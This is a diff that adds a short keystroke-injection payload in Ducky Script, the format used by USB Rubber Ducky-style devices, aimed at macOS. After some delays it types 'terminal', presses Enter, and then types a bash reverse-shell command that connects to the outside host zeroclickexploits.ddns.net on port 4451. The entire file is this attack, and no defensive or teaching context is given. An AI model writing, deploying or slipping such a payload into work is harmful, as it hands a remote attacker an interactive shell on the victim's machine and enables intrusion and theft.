@@ -1,0 +1,9 @@
+DELAY 1000
+REM Execute reverse shell on macOS GUI
+SPACE
+DELAY 500
+STRING terminal
+ENTER
+DELAY 500
+STRING bash -i >& /dev/tcp/zeroclickexploits.ddns.net/4451 0>&1
+ENTER
